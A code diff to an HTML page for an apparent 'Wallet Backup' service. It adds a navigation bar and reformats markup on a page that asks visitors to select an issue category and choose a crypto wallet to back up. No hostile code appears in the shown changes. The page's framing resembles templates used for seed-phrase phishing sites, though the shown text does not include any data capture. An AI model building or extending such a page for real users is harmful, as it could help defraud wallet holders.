@@ -19,12 +19,33 @@
     />
   </head>
   <body class="bg-gray-100">
+    <nav
+      class="bg-blue-500 p-3 fixed w-full flex justify-between px-8 items-center space-x-4"
+    >
+      <a href="./index.html">
+        <img
+          src="./asset/image/web-logo.png"
+          alt="wallet backup"
+          title="Wallet Backup"
+          class="w-20 h-10 rounded-full"
+        />
+      </a>
+
+      <span id="getStarted" class="bg-white py-1 px-4 rounded cursor-pointer">
+        🟰
+      </span>
+    </nav>
+
+    
+
     <div>
       <div class="text-center pt-4 flex items-center justify-center flex-col">
         <h1 class="text-3xl">PLEASE SELECT ISSUE CATEGORY</h1>
         which of this is related to your issue?
       </div>
-      <div class="p-4 flex items-center justify-center gap-4 flex-wrap w-full">
+      <div
+        class="p-4 flex items-center justify-center gap-4 flex-wrap w-full"
+      >
         <div class="bg-blue-500 text-white rounded-xl p-4">
           <a
             href="./wallet.html"
@@ -81,7 +102,7 @@
       <div
         class="absolute pb-10 overflow-y-auto top-0 md:bottom-0 no-scrollbar flex flex-col items-center justify-center bg-gray-800 bg-opacity-70 z-40"
       >
-        <!-- List of wallet to backup -->
+     <!-- List of wallet to backup -->
         <div class="flex gap-4 flex-wrap mb-4 items-center justify-center">
           <div
             class="text-center bg-blue-500 p-4 flex items-center flex-col shadow-xl rounded-2xl"
@@ -419,8 +440,10 @@
             </a>
             <h1 class="text-white font-bold">Blockchain</h1>
           </div>
+          
         </div>
         <!-- End of the List of wallet to backup -->
+
 
         <a href="./wallet.html"
           ><button
@@ -442,6 +465,7 @@
         <i class="fa-solid fa-x"></i>
       </div>
     </div>
+    
 
     <script>
       // Get references to the menu and close button
